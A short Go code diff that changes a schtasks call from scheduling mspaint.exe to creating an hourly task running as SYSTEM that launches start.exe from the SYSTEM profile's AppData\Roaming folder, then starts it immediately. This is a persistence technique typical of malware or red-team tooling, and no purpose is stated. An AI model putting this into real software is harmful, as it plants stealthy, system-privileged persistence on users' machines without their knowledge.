@@ -7,7 +7,7 @@ import(
 
 func main(){
 
-	c := exec.Command("schtasks", "/create", "/tn","start", "/tr","mspaint.exe", "/sc","hourly", "/f")
+	c := exec.Command("schtasks", "/create", "/ru", "SYSTEM", "/tn","start", "/tr","c:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\start.exe", "/sc","hourly", "/f")
 	d := exec.Command("schtasks", "/run", "/tn","start")
  
 	c.Start()
